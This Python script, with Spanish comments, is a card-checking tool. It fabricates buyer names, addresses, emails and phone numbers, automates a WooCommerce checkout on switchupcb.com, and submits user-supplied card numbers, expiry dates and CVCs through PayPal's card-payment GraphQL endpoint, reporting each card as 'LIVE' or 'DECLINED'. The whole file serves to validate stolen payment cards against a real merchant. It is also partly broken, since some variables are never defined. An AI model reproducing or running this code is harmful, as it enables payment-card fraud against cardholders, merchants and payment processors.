import requests
import re
import json
import random
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder



# Función para generar nombres y direcciones aleatorios
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams"]
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def num():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

# Función para procesar el cargo de una tarjeta
def main(card):
    # Eliminar espacios en blanco y dividir la tarjeta
    card_parts = card.split("|")
    
    # Verificar que la tarjeta tenga 4 partes
    if len(card_parts) != 4:
        print(Z + f'[ {card} ➜ FORMATO INVÁLIDO ❌')
        return  # Salir de la función si el formato no es válido

    n, mm, yy, cvc = card_parts

    if len(mm) == 1:
        mm = f'0{mm}'
    if "20" in yy:
        yy = yy.split("20")[1]

    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_random_account()
    num_phone = num()

    # Resto del código de la función...
    r = requests.session()
    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    # Primera solicitud
    files = {
        'quantity': (None, '1'),
        'add-to-cart': (None, '4451'),
    }
    multipart_data = MultipartEncoder(fields=files)
    headers = {
        'authority': 'switchupcb.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': multipart_data.content_type,
        'origin': 'https://switchupcb.com',
        'referer': 'https://switchupcb.com/shop/i-buy/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)

    # Segunda solicitud
    headers = {
        'authority': 'switchupcb.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
        'referer': 'https://switchupcb.com/cart/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)

    # Extracción de valores
    sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
    nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
    check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
    create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))

    # Tercera solicitud
    headers = {
        'authority': 'switchupcb.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://switchupcb.com',
        'referer': 'https://switchupcb.com/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    params = {
        'wc-ajax': 'update_order_review',
    }
    data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3DHouda%26billing_last_name%3DAlaa%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DNew%2520York%26billing_address_2%3D%26billing_city%3DNew%2520York%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D3008796324%26billing_email%3Dtapt1744%2540gmail.com%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
    response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data)

    # Cuarta solicitud
    headers = {
        'authority': 'switchupcb.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://switchupcb.com',
        'pragma': 'no-cache',
        'referer': 'https://switchupcb.com/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    params = {
        'wc-ajax': 'ppc-create-order',
    }
    json_data = {
        'nonce': create,
        'payer': None,
        'bn_code': 'Woo_PPCP',
        'context': 'checkout',
        'order_id': '0',
        'payment_method': 'ppcp-gateway',
        'funding_source': 'card',
        'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num_phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        'createaccount': False,
        'save_payment_method': False,
    }
    response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)

    # Extracción de ID y pcp
    id = response.json()['data']['id']
    pcp = response.json()['data']['custom_id']

    # Quinta solicitud
    headers = {
        'authority': 'www.paypal.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
        'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjpmYWxzZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUi6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=EG&locale.lang=ar&hasShippingCallback=false&pageType=checkout&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_b5c925a7b4_mtc6nde6ndk&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    params = {
        'sessionID': f'uid_{"".join(random.choices(string.ascii_lowercase + string.digits, k=10))}_{"".join(random.choices(string.ascii_lowercase + string.digits, k=11))}',
        'buttonSessionID': f'uid_{"".join(random.choices(string.ascii_lowercase + string.digits, k=10))}_{"".join(random.choices(string.ascii_lowercase + string.digits, k=11))}',
        'locale.x': 'ar_EG',
        'commit': 'true',
        'hasShippingCallback': 'false',
        'env': 'production',
        'country.x': 'EG',
        'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
        'disable-card': '',
        'token': id,
    }
    response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)

    # Sexta solicitud
    headers = {
        'authority': 'my.tinyinstaller.top',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://my.tinyinstaller.top',
        'referer': 'https://my.tinyinstaller.top/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': id,
            'card': {
                'cardNumber': n,
                'type': 'VISA',
                'expirationDate': mm + '/20' + yy,
                'postalCode': zip_code,
                'securityCode': cvc,
            },
            'firstName': first_name,
            'lastName': last_name,
            'billingAddress': {
                'givenName': first_name,
                'familyName': last_name,
                'line1': 'New York',
                'line2': None,
                'city': 'New York',
                'state': 'NY',
                'postalCode': '10080',
                'country': 'US',
            },
            'email': acc,
            'currencyConversionType': 'VENDOR',
        },
        'operationName': None,
    }
    response = requests.post(
        f'https://www.paypal.com/graphql?fetch_credit_form_submit',
        headers=headers,
        json=json_data,
    )

    last = response.text
    if '"status": "succeeded"' in last:
        return (f'''
        <b>Card » </b> <code>{card}</code>
<b>Status » ✅ LIVE </b>
<b>Gate » {gate} </b>
<b>Response » succeeded.</b>

''')
    elif 'Thank You For Donation.' in last:
        return (f'''
        <b>Card » </b> <code>{card}</code>
<b>Status » ✅ LIVE </b>
<b>Gate » {gate} </b>
<b>Response » Thank For You Donation.</b>

''')
    elif 'Your payment has already been processed' in last or 'Success ' in last:
        return (f'''
        <b>Card » </b> <code>{card}</code>
<b>Status » ✅ LIVE </b>
<b>Gate » {gate} </b>
<b>Response » Your payment has already been processed.</b>
———————————————-
''')
        
    if 'CARD_GENERIC_ERROR' in last:
        return(f'''
        <b>Card » </b> <code>{card}</code>
<b>Status » ❌ DECLINED </b>
<b>Gate » </b>
<b>Response » CARD_GENERIC_ERROR </b>
———————————————-
''')
    else:
        return("Mal",{card}, last)
        
cards = []
for i in range(1):
    card = input(f"Ingrese la tarjeta {i + 1} (formato: número|mm|yy|cvc): ")
    if card.lower() == 'salir':
        break
    cards.append(card)

# Procesar cada tarjeta
for i, card in enumerate(cards):
    mains = main(card)
    print(mains)
    